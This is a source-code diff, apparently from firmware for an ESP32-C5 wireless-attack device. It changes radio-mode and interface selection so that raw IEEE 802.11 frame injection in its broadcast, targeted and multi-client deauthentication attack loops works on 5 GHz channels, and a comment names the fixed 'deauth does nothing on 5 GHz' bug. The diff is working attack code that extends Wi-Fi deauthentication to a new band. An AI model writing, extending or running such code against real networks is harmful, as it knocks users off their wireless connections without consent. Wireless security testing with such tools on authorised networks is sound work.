@@ -158,14 +158,44 @@ int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3)
 }
 
 /**
- * @brief Sends one raw IEEE802.11 frame through AP interface.
+ * @brief Chooses the radio mode for a channel: STA on 5 GHz, APSTA on 2.4 GHz.
+ *
+ * The ESP32-C5 SoftAP cannot tune to a 5 GHz channel, so in APSTA mode
+ * esp_wifi_set_channel() on a 5 GHz channel returns ESP_ERR_INVALID_ARG
+ * (ESP-IDF #18334). STA mode tunes 5 GHz fine and still injects via
+ * WIFI_IF_STA. 2.4 GHz keeps APSTA so injection can use the AP interface.
+ * @param[in] channel Target channel.
+ * @return esp_err_t Result of the chosen radio init.
+ */
+static esp_err_t poom_wifi_attacks_init_radio_for_channel_(uint8_t channel)
+{
+    if(channel > POOM_WIFI_CTRL_WIFI_CHANNEL_MAX)
+    {
+        return poom_wifi_ctrl_init_sta();
+    }
+    return poom_wifi_ctrl_init_apsta();
+}
+
+/**
+ * @brief Returns the interface to inject on, matching the current radio mode.
+ * @return wifi_interface_t WIFI_IF_STA in STA-only mode, else WIFI_IF_AP.
+ */
+static wifi_interface_t poom_wifi_attacks_tx_iface_(void)
+{
+    wifi_mode_t mode = WIFI_MODE_NULL;
+    (void)esp_wifi_get_mode(&mode);
+    return (mode == WIFI_MODE_STA) ? WIFI_IF_STA : WIFI_IF_AP;
+}
+
+/**
+ * @brief Sends one raw IEEE802.11 frame through the mode-appropriate interface.
  * @param[in] frame Raw frame buffer.
  * @param[in] frame_len Raw frame size in bytes.
  * @return void
  */
 static void poom_wifi_attacks_send_raw_frame_(const uint8_t *frame, size_t frame_len)
 {
-    esp_err_t error = esp_wifi_80211_tx(WIFI_IF_AP, frame, frame_len, false);
+    esp_err_t error = esp_wifi_80211_tx(poom_wifi_attacks_tx_iface_(), frame, frame_len, false);
     if(error != ESP_OK)
     {
         POOM_PRINTF_E("esp_wifi_80211_tx failed: %s", esp_err_to_name(error));
@@ -186,7 +216,7 @@ static void poom_wifi_attacks_broadcast_attack_task_(void *param)
 
     free(param);
 
-    esp_err_t error = poom_wifi_ctrl_init_apsta();
+    esp_err_t error = poom_wifi_attacks_init_radio_for_channel_(ap.primary);
     if(error != ESP_OK)
     {
         POOM_PRINTF_E("poom_wifi_ctrl_init_apsta failed: %s", esp_err_to_name(error));
@@ -285,7 +315,7 @@ static void poom_wifi_attacks_targeted_attack_task_(void *param)
 
     free(param);
 
-    esp_err_t error = poom_wifi_ctrl_init_apsta();
+    esp_err_t error = poom_wifi_attacks_init_radio_for_channel_(ap.primary);
     if(error != ESP_OK)
     {
         POOM_PRINTF_E("poom_wifi_ctrl_init_apsta failed: %s", esp_err_to_name(error));
@@ -310,12 +340,16 @@ static void poom_wifi_attacks_targeted_attack_task_(void *param)
                   task_param.client[4],
                   task_param.client[5]);
 
-    (void)esp_wifi_set_channel(ap.primary, WIFI_SECOND_CHAN_NONE);
+    /* Route through the band-aware wrapper so 5 GHz channels switch the C5
+     * into the right band first; a bare esp_wifi_set_channel() stays on 2.4
+     * GHz and silently fails to tune (the "deauth does nothing on 5 GHz" bug). */
+    (void)poom_wifi_ctrl_set_channel(ap.primary);
     (void)esp_wifi_set_promiscuous(true);
 
+    wifi_interface_t tx_if = poom_wifi_attacks_tx_iface_();
     while(s_poom_wifi_attacks_targeted_running)
     {
-        esp_err_t tx = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+        esp_err_t tx = esp_wifi_80211_tx(tx_if, frame, sizeof(frame), false);
         if(tx != ESP_OK)
         {
             POOM_PRINTF_E("esp_wifi_80211_tx failed: %s", esp_err_to_name(tx));
@@ -392,7 +426,7 @@ static void poom_wifi_attacks_targeted_multi_task_(void *param)
 
     free(param);
 
-    esp_err_t error = poom_wifi_ctrl_init_apsta();
+    esp_err_t error = poom_wifi_attacks_init_radio_for_channel_(ap.primary);
     if(error != ESP_OK)
     {
         POOM_PRINTF_E("poom_wifi_ctrl_init_apsta failed: %s", esp_err_to_name(error));
@@ -410,7 +444,10 @@ static void poom_wifi_attacks_targeted_multi_task_(void *param)
                   (unsigned)task_param.count);
     POOM_PRINTF_I("SSID: %s | CH: %d", ap.ssid, ap.primary);
 
-    (void)esp_wifi_set_channel(ap.primary, WIFI_SECOND_CHAN_NONE);
+    /* Route through the band-aware wrapper so 5 GHz channels switch the C5
+     * into the right band first; a bare esp_wifi_set_channel() stays on 2.4
+     * GHz and silently fails to tune (the "deauth does nothing on 5 GHz" bug). */
+    (void)poom_wifi_ctrl_set_channel(ap.primary);
     (void)esp_wifi_set_promiscuous(true);
 
     while(s_poom_wifi_attacks_targeted_running && (task_param.count > 0U))
@@ -418,7 +455,7 @@ static void poom_wifi_attacks_targeted_multi_task_(void *param)
         esp_err_t tx;
 
         memcpy(&frame[4], task_param.clients[index], 6); /* addr1: dest = client */
-        tx = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+        tx = esp_wifi_80211_tx(poom_wifi_attacks_tx_iface_(), frame, sizeof(frame), false);
         if(tx != ESP_OK)
         {
             POOM_PRINTF_E("esp_wifi_80211_tx failed: %s", esp_err_to_name(tx));
